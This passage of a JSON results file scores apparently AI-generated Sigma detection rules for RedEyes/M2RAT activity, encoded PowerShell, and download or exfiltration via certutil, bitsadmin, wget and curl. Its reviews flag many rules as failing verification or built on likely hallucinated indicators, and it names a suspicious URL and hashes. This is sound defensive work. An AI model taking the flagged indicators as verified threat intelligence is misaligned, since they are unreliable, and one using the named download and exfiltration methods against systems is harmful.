          "Failed to detect the attack in real-world verification (0 events found), indicating poor detection coverage or incorrect implementation",
          "Relies on a hash string appearing in the Image path or CommandLine, which is unlikely since file paths and commands don't typically include raw file hashes",
          "Risk of hallucination: the rule uses a specific MD5-like hash without confirming its association with the TTP; no external threat intel reference provided",
          "Detection logic may be fundamentally flawed \u2014 adversaries do not usually expose file hashes in command lines or image paths"
        ],
        "suggestions": [
          "Revise detection logic to use hash-based indicators via file integrity monitoring or EDR file hash telemetry, not string matching in Image/CommandLine",
          "Integrate with threat intelligence feeds that provide known malicious file hashes and associate them with proper TTPs",
          "Use Sigma's 'FileHash-' related fields instead of string matching in Image or CommandLine",
          "Validate rule logic with actual malware samples or emulation plans that log real file execution",
          "Add MITRE ATT&CK ID mapping with correct technique (e.g., T1204.002) if known"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Downloader Detected via Known Malicious Hash and Download Commands",
        "rule_id": "212f042c-98b5-4d67-8826-b2304fa736c9",
        "quality_score": 0.775,
        "status": "pass",
        "strengths": [
          "The rule successfully detected the targeted TTP in real-world verification with 2 events found, indicating strong detection coverage.",
          "Multiple detection paths (malicious hash, PowerShell, wget, curl) increase resilience against evasion.",
          "Clear false positive exclusions are documented, aiding operational tuning.",
          "Uses precise field conditions (e.g., Image ends with, CommandLine contains) which are efficient in SIEM queries.",
          "Aligned with MITRE ATT&CK technique T1105 (Ingress Tool Transfer), enhancing threat context."
        ],
        "weaknesses": [
          "Potential for false positives due to legitimate use of download tools (PowerShell, wget, curl) in administrative or update scenarios, as acknowledged in falsepositives list.",
          "The rule relies on a single hardcoded hash; adversaries can easily change hashes to evade detection.",
          "No exclusion of internal or trusted domains/URLs in the command line checks, increasing FP risk.",
          "No use of process ancestry or user context, which could help distinguish malicious from benign activity."
        ],
        "suggestions": [
          "Add source IP, domain, or URL reputation checks to reduce false positives and improve context.",
          "Implement hash list expansion with multiple known malicious hashes or use fuzzy hashing for better coverage.",
          "Include process parent/child context (e.g., browser spawning PowerShell) to increase precision.",
          "Consider adding field normalization or regex patterns to detect obfuscated PowerShell commands.",
          "Introduce allow-listing mechanisms for known good scripts or tools that use these download methods."
        ],
        "metrics": {
          "accuracy": 0.9,
          "completeness": 0.8,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detect Base64 Encoded Commands Execution",
        "rule_id": "5f166ada-3d3e-4ab2-a05d-029445163385",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets multiple vectors for Base64 encoded command execution (PowerShell, CertUtil, cmd.exe), increasing breadth.",
          "Uses precise field matching (e.g., Image ends with, CommandLine contains) which aligns well with Sysmon process creation logs.",
          "Includes relevant MITRE ATT&CK tags (T1027 - Data Encoding) for better threat context.",
          "Acknowledges known false positives in the rule metadata, aiding analysts in triage."
        ],
        "weaknesses": [
          "Failed to detect the attack in real-world verification (0 events found), indicating poor detection coverage or misalignment with actual TTP usage.",
          "Relies solely on keyword matching which may miss obfuscated or alternative command syntax.",
          "No use of regular expressions or pattern matching for Base64 strings, potentially missing encoded payloads without explicit flags.",
          "Rule was generated via 'langchain' and may contain hallucinated logic not validated against real attack patterns."
        ],
        "suggestions": [
          "Incorporate regex patterns to detect actual Base64-encoded strings in command lines, not just encoding tool usage.",
          "Validate and refine the rule using real attack data or red team exercises to improve detection accuracy.",
          "Add normalization or decoding simulation in detection logic (e.g., detect long encoded strings even without -EncodedCommand flag).",
          "Improve verification process by testing against known attack samples that use Base64 encoding in diverse ways.",
          "Consider adding process command-line length thresholds as an additional signal for obfuscation."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Base64 Encoding of Command Output Detected",
        "rule_id": "a552c666-5488-4930-b586-6b6291ae5e06",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets a relevant and common technique (Base64 encoding) used in data exfiltration, aligning with MITRE ATT&CK T1132.",
          "Covers multiple vectors (certutil, PowerShell, cmd.exe), increasing breadth of detection.",
          "Includes well-defined false positives with documented legitimate use cases, aiding analysts in triage.",
          "Uses efficient string matching and field-specific conditions (e.g., CommandLine|contains), contributing to good performance."
        ],
        "weaknesses": [
          "The rule failed to detect any events in real-world verification (0/0), indicating poor detection coverage or misalignment with actual attack behavior.",
          "Relies solely on command-line artifacts, which can be easily obfuscated or altered by attackers.",
          "No use of parent-child process context (e.g., cmd spawning certutil) to strengthen detection logic.",
          "Contains no time correlation or behavioral thresholds, increasing risk of false positives from isolated benign commands."
        ],
        "suggestions": [
          "Enhance detection logic with process ancestry (e.g., detect suspicious parent processes launching certutil or PowerShell with encoded commands).",
          "Add event frequency or thresholding (e.g., multiple Base64 encoding attempts in a short window) to reduce false positives.",
          "Incorporate file creation or network connection correlation (e.g., encoded file written then exfiltrated) to improve confidence.",
          "Validate and update the rule using real attack data or red team exercises to ensure it matches actual adversary behavior.",
          "Consider adding detection for other Base64-capable tools (e.g., MSHTA, WMI, JScript) to improve coverage."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Download of JPEG Malware Tool from Suspicious URL",
        "rule_id": "9155e402-7b41-452f-8331-4967c14d7a39",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "Covers multiple command-line tools (PowerShell, cmd, bitsadmin, certutil, curl) commonly abused for downloading malware",
          "Uses specific command-line indicators (URL and .jpg extension) to narrow detection scope",
          "Includes relevant false positives in metadata, showing awareness of operational impact",
          "Efficient condition structure with clear logical ORs across selections"
        ],
        "weaknesses": [
          "Rule failed to detect the attack in real-world verification (0 events found), indicating poor detection coverage",
          "Relies on a single hardcoded suspicious URL (elearning.or.kr/popup/handle/1.html) not confirmed in TTP details, risking hallucination",
          "No contextual enrichment or domain reputation checks; static IOCs reduce longevity",
          "Detection logic does not include process ancestry or user context, increasing FP risk"
        ],
        "suggestions": [
          "Replace hardcoded URL with a lookup table or threat intel feed to support dynamic updates and multiple IOCs",
          "Add process parent-child context (e.g., browser spawning cmd) to improve accuracy",
          "Include additional indicators such as network connection logs or file creation events to enable correlation",
          "Validate IOC relevance through threat intelligence sources to avoid hallucinated domains"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Potential Keylogging or Screenshot Data Exfiltration",
        "rule_id": "e1e2d89a-816f-4bf6-9713-3ef04bc6913c",
        "quality_score": 0.775,
        "status": "pass",
        "strengths": [
          "The rule successfully detected the targeted behavior in real-world verification with 6 events found",
          "Covers multiple exfiltration vectors (certutil, bitsadmin) and data collection methods (keylogging, screenshots)",
          "Uses specific field conditions (Image, CommandLine) with appropriate operators (endswith, contains)",
          "Includes relevant false positives in documentation, showing awareness of operational impact",
          "Efficient query performance with sub-second execution time (431ms)"
        ],
        "weaknesses": [
          "Relies on keyword matching in CommandLine which can be easily evaded by obfuscation",
          "Potential for false positives due to generic terms like 'keylog' and 'screenshot' in legitimate scripts",
          "No use of parent-child process context or other behavioral enrichments to reduce ambiguity",
          "Verification method notes 'Keyword Fallback', suggesting possible reliance on incomplete field extractions"
        ],
        "suggestions": [
          "Enhance detection logic with additional context such as parent process (e.g., wscript, mshta spawning powershell)",
          "Add command-line argument pattern analysis to reduce reliance on keywords",
          "Include file creation or network connection correlation for higher confidence in exfiltration",
          "Consider using Sigma's 'base64' or 'encoded_command' detection capabilities to catch obfuscated PowerShell",
          "Validate field extractions in Splunk to ensure reliability beyond keyword fallback"
        ],
        "metrics": {
          "accuracy": 0.8,
          "completeness": 0.8,
          "efficiency": 0.9,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "M2RAT Remote Command Execution via cmd.exe",
        "rule_id": "79bbd622-9549-446b-8610-72134a8cf991",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets a specific and relevant TTP (Remote Access Tools) using process creation events, which is appropriate for detecting M2RAT activity.",
          "Uses Sysmon data effectively with precise field conditions such as ParentImage and Image path endings.",
          "Includes relevant false positives in metadata, showing awareness of operational environment impacts.",
          "Rule structure is clean and uses logical separation of detection conditions (parent-child process vs. command line indicators)."
        ],
        "weaknesses": [
          "The rule failed to detect any real-world events (0/0), indicating poor detection coverage or lack of alignment with actual attack behavior.",
          "Relies on exact string match for 'M2RAT.exe' and 'M2RAT' in command line, which is easily evaded via obfuscation or minor name changes.",
          "No evidence that 'M2RAT.exe' or command-line references are definitive indicators of the threat; potential for hallucination since TTP details are sparse (e.g., 'unknown' ID and tactic)."
        ],
        "suggestions": [
          "Enhance detection logic with additional indicators such as network connections, child processes, or command-line arguments commonly used by M2RAT.",
          "Add support for case-insensitive matching and regex patterns to account for obfuscation (e.g., 'm2rat.exe', 'M2*RAT.exe').",
          "Incorporate behavioral patterns (e.g., cmd.exe spawning from unusual parents or making outbound connections) to improve robustness.",
          "Validate rule against known M2RAT samples or threat intelligence reports to ensure accuracy and relevance.",
          "Update TTP mapping with confirmed MITRE ATT&CK IDs and tactics to improve tagging and integration with threat intelligence platforms."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exploitation of HWP EPS Vulnerability (CVE-2017-8291)",
        "rule_id": "97feb033-b7ed-40b1-9e20-71a4803bd786",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets a specific vulnerability (CVE-2017-8291) and aligns with known adversary behavior (RedEyes group).",
          "Log source is well-defined using Sysmon process creation, enabling reliable telemetry.",
          "Includes relevant false positives in metadata, showing awareness of operational impact.",
          "Rule structure is simple and readable with clear selection criteria."
        ],
        "weaknesses": [
          "Rule failed to detect any events during real-world verification, indicating poor detection coverage or misalignment with actual attack patterns.",
          "Selection logic for winword.exe relies on 'Form.hwp' in command line, which is overly specific and likely not used in real attacks.",
          "Inclusion of 'CVE-2017-8291' in cmd.exe command line is unrealistic\u2014attackers do not reference CVEs in exploit commands.",
          "Relies on very narrow indicators that are easily bypassed (e.g., file name, hardcoded strings)."
        ],
        "suggestions": [
          "Revise detection logic to focus on behavioral indicators such as child processes spawned by hwp.exe, suspicious command-line arguments, or interactions with EPS/PDF conversion components.",
          "Remove unrealistic condition 'CommandLine|contains|CVE-2017-8291'\u2014this is a hallucination and not reflective of real exploit activity.",
          "Enhance coverage by incorporating known IOAs such as specific DLL loads, network connections, or file writes post-exploitation.",
          "Use broader pattern matching for .hwp file access while applying context (e.g., parent process, command-line flags) to reduce false positives.",
          "Validate rule against actual malware samples or threat intelligence reports related to RedEyes group TTPs."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Execution of Suspicious Executable from Temp Directory (lskdjfel.exe)",
        "rule_id": "eca532ce-654b-4684-8bd9-d7b4a7449bb6",
        "quality_score": 0.525,
        "status": "fail",
        "strengths": [
          "Rule targets a high-risk behavior (execution from Temp directory), which is commonly associated with malicious activity",
          "Uses multiple detection conditions (Image, path, CommandLine) to increase detection resilience",
          "Includes relevant MITRE ATT&CK tags for context and alignment",
          "Specifies Sysmon as the log source, ensuring appropriate logging is in place"
        ],
        "weaknesses": [
          "Rule failed to detect any events in real-world verification, indicating poor coverage or mismatch with actual attack pattern",
          "Overly specific to a single hardcoded filename (lskdjfel.exe), making it easily evadable",
          "No TTP ID or tactic provided in the target TTP, reducing confidence in alignment",
          "High potential for false positives due to common legitimate use of Temp directory for execution",
          "Detection logic may be redundant or conflicting (e.g., 'Image|endswith' vs 'Image|contains' on same path)"
        ],
        "suggestions": [
          "Generalize the rule to detect suspicious executables in Temp directories using patterns (e.g., random names, uncommon extensions) rather than hardcoding a single filename",
          "Incorporate additional behavioral indicators such as parent process, user context, or command-line arguments to improve precision",
          "Validate detection logic against known attack patterns and update TTP mapping with correct MITRE ID (e.g., T1543.003)",
          "Add file hash or digital signature checks to reduce false positives",
          "Re-test the rule with updated logic in a realistic environment to confirm detection capability"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.6,
          "efficiency": 0.7,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Archive Collected Data via RAR with Password Protection",
        "rule_id": "920f62d0-45e5-41ce-9aa2-ef993a2c60da",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "Specific detection logic targeting RAR with password protection (-hp) and compression level (-m1) flags",
          "Aligned with MITRE ATT&CK technique T1560.001 (Archive Collected Data)",
          "Includes relevant false positive sources, showing awareness of operational context",
          "Efficient condition structure using simple AND logic on indexed fields",
          "Uses Sysmon process creation data, which is commonly available and reliable"
        ],
        "weaknesses": [
          "Rule failed to detect any real-world events during verification (0/0), indicating poor practical detection coverage",
          "Relies on specific command-line arguments (-m1) that may not be consistently used by adversaries",
          "Potential for evasion via alternative compression tools (e.g., 7-zip, zip, PowerShell Compress-Archive)",
          "Generation method listed as 'langchain'\u2014suggests possible AI-generated rule without empirical tuning",
          "No mention of monitoring other archive tools or fallback behaviors in the rule or false positives"
        ],
        "suggestions": [
          "Broaden detection logic to include other common archiving tools (e.g., 7z.exe, zip.exe) and their password-protected flags",
          "Test and validate rule against real attack data or red team exercises to improve reliability",
          "Replace or supplement -m1 with variable compression levels (-m0 to -m5) to increase coverage",
          "Add file creation or network exfiltration correlation to reduce false positives and improve context",
          "Update rule metadata with verified TTP ID and tactic from MITRE ATT&CK framework"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exfiltration Over Alternative Protocol via Encoded MAC Address Indicators",
        "rule_id": "01414447-c055-450d-a708-d96255dbdd5f",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets multiple common execution vectors (cmd.exe, powershell.exe, certutil.exe), increasing its applicability across different attacker techniques.",
          "Uses specific command-line indicators such as 'result_' and '_Encoded MAC Address Value_' which are aligned with suspicious behavior patterns.",
          "Includes documented false positives, showing awareness of operational impact."
        ],
        "weaknesses": [
          "The rule failed to detect any real-world events during verification (0/0), indicating poor detection coverage or misalignment with actual attack behavior.",
          "Relies on hardcoded strings like '_Encoded MAC Address Value_cap' which may be easily modified by adversaries, reducing detection robustness.",
          "No evidence that the encoded MAC address patterns are actually used in the referenced TTP; potential hallucination due to lack of supporting TTP details."
        ],
        "suggestions": [
          "Improve detection logic by incorporating regex patterns to identify encoded MAC addresses (e.g., base64-encoded hex patterns) rather than relying on fixed strings.",
          "Validate detection indicators against real attack samples or threat intelligence to ensure alignment with actual adversary behavior.",
          "Add process ancestry or user context to reduce false positives (e.g., parent-child process chains leading to suspicious execution).",
          "Consider enriching the rule with file creation or network connection correlations to increase confidence in exfiltration detection."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Suspicious Child Processes Spawned by explorer.exe (Process Injection)",
        "rule_id": "465a1e62-fac7-4a61-845e-a9b1693726fc",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets a known malicious behavior pattern: explorer.exe spawning command-line utilities, which is suspicious in most environments.",
          "The rule is well-structured with clear selection criteria for multiple child processes (PowerShell, cmd, wmic, rundll32).",
          "Relevant MITRE ATT&CK tags (T1055, defense evasion) are included, improving threat context.",
          "False positives are thoughtfully documented, showing awareness of legitimate edge cases."
        ],
        "weaknesses": [
          "The rule failed to detect any events in the real-world verification, indicating poor detection coverage against the intended TTP.",
          "Relies solely on parent-child process relationships without additional context (e.g., command-line arguments, image paths, or user context), increasing risk of evasion.",
          "No use of command-line monitoring, which could help distinguish malicious from benign usage of these tools.",
          "The TTP ID is listed as 'unknown', reducing traceability to a specific adversary or campaign."
        ],
        "suggestions": [
          "Enhance detection logic by incorporating command-line arguments (e.g., obfuscated scripts, encoded commands) to improve signal-to-noise ratio.",
          "Add additional context such as user context (e.g., SYSTEM vs user), image integrity (signed/unsigned), or child process depth.",
          "Consider using a behavioral approach (e.g., sequence of events or process ancestry) rather than a single parent-child relationship.",
          "Validate rule logic against real attack data or red team exercises to ensure it captures actual malicious behavior.",
          "Update the TTP ID if the rule is mapped to a known threat or campaign to improve threat intelligence alignment."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Process Hollowing via Explorer.exe with M2RAT Payload",
        "rule_id": "17a00425-c245-4124-ac67-efae97aaf5df",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets a specific and high-risk technique (Process Hollowing) using a known malicious indicator (M2RAT in command line)",
          "Log source is well-defined with Sysmon process creation events, which are reliable for this type of detection",
          "Performance is efficient, as evidenced by sub-second query execution time (432ms) in verification"
        ],
        "weaknesses": [
          "Rule failed to detect the actual attack in real-world verification (0 events found), indicating poor detection coverage",
          "Overly specific to M2RAT in command line, which may not be present during actual process hollowing (payload may be injected post-startup)",
          "Relies on command-line artifact in explorer.exe, which is uncommon and easily bypassed (explorer.exe rarely used this way in real attacks)",
          "Contains potential hallucination: references 'M2RAT' as a command-line string without confirmation that this appears in the actual TTP or attack pattern"
        ],
        "suggestions": [
          "Broaden detection logic to include anomalous child processes of explorer.exe (e.g., suspicious executables spawned from it)",
          "Include other indicators of process hollowing such as memory protection changes (MEM_COMMIT, MEM_RESERVE), suspicious PE header characteristics, or VAD tree anomalies via Sysmon Event ID 10 or 12",
          "Use behavioral patterns instead of hardcoded strings (e.g., detect code injection followed by thread execution in suspended explorer.exe process)",
          "Validate all IOCs (like 'M2RAT') against real attack data to avoid hallucinated indicators",
          "Consider correlation across multiple events rather than single-event matching to improve accuracy and coverage"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.6,
          "efficiency": 0.9,
          "maintainability": 0.7
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "M2RAT Command Execution via Parent Process",
        "rule_id": "cdebae8a-9016-4e1a-9d33-2a5129f93b0c",
        "quality_score": 0.625,
        "status": "fail",
        "strengths": [
          "The rule targets a specific and relevant behavior: command-line interpreters launched by M2RAT, which aligns with command-and-control (C2) activity",
          "Uses precise Sysmon process creation data with clear field mappings (Image and ParentImage)",
          "Includes documented false positives, showing awareness of operational impact",
          "Efficient condition structure using simple OR logic between two focused selections"
        ],
        "weaknesses": [
          "Rule failed to detect any real-world events during verification, indicating poor detection coverage or mismatch with actual TTP behavior",
          "Relies solely on 'ParentImage|contains' with 'M2RAT' string match, which is easily evadable and may not reflect real malware naming",
          "No supporting indicators (e.g., command-line arguments, network connections, file paths) to strengthen detection logic",
          "TTP information is incomplete (missing attack ID and tactic), reducing confidence in alignment"
        ],
        "suggestions": [
          "Augment detection logic with additional indicators such as suspicious command-line arguments (e.g., /c, -Command), unusual working directories, or known M2RAT C2 patterns",
          "Replace or supplement 'ParentImage|contains' with hash-based or behavioral indicators if available",
          "Validate rule against real or simulated M2RAT samples to ensure it triggers on actual attack traffic",
          "Enrich rule metadata with accurate MITRE ATT&CK mapping using proper technique ID and tactic",
          "Consider adding process command-line checks to reduce false negatives from similarly named benign tools"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.6,
          "efficiency": 0.9,
          "maintainability": 0.7
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Data Staging to %TEMP% Path Detected",
        "rule_id": "132ea11a-ad74-4cfa-8775-b3134bc0ad59",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets a specific and relevant behavior associated with data staging: writing timestamped files to %TEMP%, which is commonly abused during exfiltration preparation.",
          "Covers multiple common adversary tools (PowerShell, cmd, wmic) that are frequently used in post-compromise activity.",
          "Includes a well-documented list of false positives, showing awareness of operational impact.",
          "Uses Sysmon process creation logs, which are reliable and widely deployed for behavioral detection."
        ],
        "weaknesses": [
          "The rule failed to detect any real-world events in verification (0/0), indicating poor detection coverage or misalignment with actual attack patterns.",
          "Relies solely on hardcoded string matching (%TEMP%\\Y_) which may not reflect actual attacker naming conventions or could be easily bypassed.",
          "No use of regex or flexible pattern matching for timestamp formats; reduces robustness.",
          "The TTP ID is listed as 'unknown' and lacks MITRE ATT&CK mapping beyond the technique name, reducing traceability."
        ],
        "suggestions": [
          "Enhance the detection logic with regex patterns to match various timestamp formats (e.g., Y_YYYYMMDD_HHMMSS or similar variants) to improve coverage.",
          "Expand the rule to include other potential data staging behaviors, such as file size thresholds or sequences of file writes followed by archive/compression tool usage.",
          "Validate and update the rule using real attack data or red team simulations to ensure it triggers on actual adversary activity.",
          "Consider enriching the rule with additional context like parent-child process relationships or command-line argument patterns to reduce false positives and increase specificity.",
          "Ensure full alignment with MITRE ATT&CK by specifying a valid technique ID (e.g., T1074.001) for better tagging and correlation."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Application Window Discovery via PhoneDataCp and PhoneDeviceManager",
        "rule_id": "c524ec82-0f26-4612-9f29-e6aa8ea1e1fc",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "Rule is focused on a specific technique (Application Window Discovery)",
          "Uses Sysmon process creation events which are reliable for detecting binary execution",
          "Includes reasonable false positive exclusions in documentation",
          "Efficient condition logic using simple OR clause"
        ],
        "weaknesses": [
          "Rule failed to detect any real-world events (0/0), indicating poor detection coverage",
          "No evidence that PhoneDataCp or PhoneDeviceManager are legitimate TTPs associated with ATT&CK technique T1010",
          "Potential hallucination: Binaries 'PhoneDataCp' and 'PhoneDeviceManager' do not appear in standard threat intelligence for Application Window Discovery",
          "Lack of additional context (e.g. command-line arguments, parent process) reduces detection accuracy"
        ],
        "suggestions": [
          "Validate and confirm if PhoneDataCp and PhoneDeviceManager are real adversarial tools or misidentified binaries",
          "Enhance detection logic with command-line arguments or parent-child process relationships",
          "Cross-reference with known threat actor usage of these binaries before deployment",
          "Consider adding network or file activity correlation to reduce false positives",
          "Re-evaluate rule if no historical events are found after extended monitoring period"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Input Capture via PhoneDeviceManager and M2RAT",
        "rule_id": "639e9d25-9743-435e-8b3e-8b68b38f4146",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "Rule targets specific indicators (PhoneDeviceManager.pdb, M2RAT) associated with input capture",
          "Includes relevant false positive mitigations in documentation",
          "Efficient condition using simple OR logic on Image field",
          "Tags aligned with MITRE ATT&CK (T1056) and custom categories"
        ],
        "weaknesses": [
          "Rule failed to detect any real-world events (0/0), indicating poor detection coverage",
          "Relies solely on filename contains matches which are easily evaded",
          "PDB file matching may only occur in debug environments, not real malware",
          "No evidence the TTP uses these exact strings in operational binaries",
          "Rule was likely hallucinated or based on non-public IOCs (M2RAT, PhoneDeviceManager.pdb not widely documented)"
        ],
        "suggestions": [
          "Replace filename contains with behavioral indicators (e.g. clipboard access, keylogging API calls)",
          "Add command-line or parent-child process logic to reduce false positives",
          "Validate IOCs against threat intelligence sources before rule creation",
          "Use hash monitoring or YARA-like binary pattern detection for more reliability",
          "Include network indicators if M2RAT has C2 patterns",
          "Retire or re-evaluate rule if no historical or test detections exist"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Execution via PowerShell or cmd",
        "rule_id": "1e6401ed-26b4-45af-b4c4-12df05f8fced",
        "quality_score": 0.775,
        "status": "pass",
        "strengths": [
          "The rule successfully detected the targeted TTP with 8 verified events in the real-world SIEM, confirming strong detection coverage",
          "Focuses on high-risk command-line arguments like '-EncodedCommand', '-enc', and 'Invoke-Expression' which are commonly used in malicious PowerShell execution",
          "Covers both PowerShell and cmd.exe, increasing breadth of detection for the Command and Scripting Interpreter technique",
          "Includes relevant false positives in metadata, showing awareness of operational impact",
          "Uses efficient Sigma syntax with clear field mappings and conditions suitable for Sysmon data"
        ],
        "weaknesses": [
          "The rule may generate false positives due to legitimate administrative or software deployment use of PowerShell and cmd with /c, /k, or start",
          "Relies on specific command-line keywords that can be easily obfuscated (e.g., encoded commands with spacing, variable substitution)",
          "Does not include detection of child processes spawned by PowerShell or cmd (e.g., wmic, certutil), limiting depth",
          "The TTP ID is listed as 'unknown', indicating incomplete threat intelligence alignment"
        ],
        "suggestions": [
          "Add process ancestry checks (e.g., parent process not explorer.exe or winlogon.exe) to reduce false positives",
          "Include detection of obfuscated command lines using regex patterns for base64 or suspicious spacing",
          "Enrich the rule with additional indicators such as command length thresholds or rare command combinations",
          "Align the rule with a valid MITRE ATT&CK ID (e.g., T1059.001) for better threat context",
          "Consider splitting into multiple rules or adding levels (low/medium/high) based on riskiness of command-line content"
        ],
        "metrics": {
          "accuracy": 0.9,
          "completeness": 0.8,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Data Staging via PE File Detected",
        "rule_id": "c76ea256-caee-4bd9-a861-e8f52792823f",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "The rule targets multiple common data staging techniques using PowerShell and certutil",
          "Uses specific hash value in command line as an indicator of compromise",
          "Includes relevant false positive exclusions in documentation",
          "Efficient condition structure with clear logical separation"
        ],
        "weaknesses": [
          "Rule failed to detect any real-world events (0/0), indicating poor detection coverage",
          "Relies on a single hardcoded hash value, making it brittle to minor changes",
          "No contextual validation (e.g., parent-child process relationships) to strengthen detection",
          "Uses a generic hash value without confirmation it's tied to known malicious activity"
        ],
        "suggestions": [
          "Replace hardcoded hash with a lookup table or list of known malicious hashes for better coverage",
          "Add process ancestry checks (e.g., parent process) to reduce false positives and increase confidence",
          "Incorporate file path or directory anomalies (e.g., temp directory usage) as additional detection signals",
          "Validate the hash '7bab405fbc6af65680443ae95c30595d' against threat intelligence; if unverified, remove or mark as example",
          "Consider using file creation events with hash matching instead of command-line parsing for more reliable detection"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Exploitation for Client Execution via EPS File Hash",
        "rule_id": "ac7c7ef8-c49d-4eea-8f23-0fe1f240698c",
        "quality_score": 0.6,
        "status": "fail",
        "strengths": [
          "Specific hash-based detection provides high-fidelity signal when the hash is truly malicious",
          "Rule covers multiple execution vectors (AcroRd32.exe, WINWORD.EXE, generic command line)",
          "Log source is appropriate (Sysmon process creation on Windows)",
          "Includes relevant MITRE ATT&CK tags for context"
        ],
        "weaknesses": [
          "Failed to detect the attack in real-world verification (0 events found)",
          "Over-reliance on a single hardcoded hash limits detection coverage",
          "Generic selection condition may increase false positives by matching unrelated processes with the hash in command line",
          "No contextual enrichment or behavioral indicators beyond hash match"
        ],
        "suggestions": [
          "Replace or augment single hash with IOCs from multiple known malicious EPS files or use YARA-style pattern matching on file content",
          "Add process ancestry or parent-child process checks to reduce false positives (e.g., block if spawned from email client)",
          "Include file creation or network connection correlations to improve confidence",
          "Validate rule against additional attack simulations to ensure detection reliability",
          "Consider using file signature or MIME type checks in addition to hash matching"
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.6
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detection: Command and Scripting Interpreter",
        "rule_id": "df0f6d8e-9f18-4f0c-8c7e-5eca28ff2ab6",
        "quality_score": 0.475,
        "status": "fail",
        "strengths": [
          "The rule is simple and focused on process creation events, which are relevant to command-line activity",
          "The performance is efficient with a query time under 500ms, indicating a lightweight search"
        ],
        "weaknesses": [
          "The rule failed to detect any real-world events (0/0), indicating poor detection coverage",
          "The detection logic relies on the presence of the word 'suspicious' in the command line, which is not representative of real attacker behavior",
          "The TTP ID and technique mapping are marked as 'unknown', reducing its alignment with known threats",
          "The rule lacks specificity and context, increasing risk of evasion"
        ],
        "suggestions": [
          "Replace generic 'suspicious' keyword with specific command-line patterns associated with malicious activity (e.g., encoded commands, suspicious flags)",
          "Map the rule to a valid MITRE ATT&CK technique ID (e.g., T1059) for better threat context",
          "Add additional detection conditions such as parent-child process anomalies or known malicious tools",
          "Tune the rule using real attack data to improve detection while minimizing false positives",
          "Include more specific observables from verified attack patterns, avoiding reliance on fallback generation methods"
        ],
        "metrics": {
          "accuracy": 0.2,
          "completeness": 0.4,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
        "evaluation_method": "langchain"
      },
      {
        "rule_title": "Detection: Process Injection",
        "rule_id": "cc2361d8-a083-4402-933d-928a26569b80",
        "quality_score": 0.55,
        "status": "fail",
        "strengths": [
          "Rule is simple and focused on process creation events",
          "Targets a known malicious technique (Process Injection)",
          "Efficient query execution time (~431ms)"
        ],
        "weaknesses": [
          "Failed to detect any real-world events (0/0 detected)",
          "Overly generic detection logic (matches 'suspicious' string in command line)",
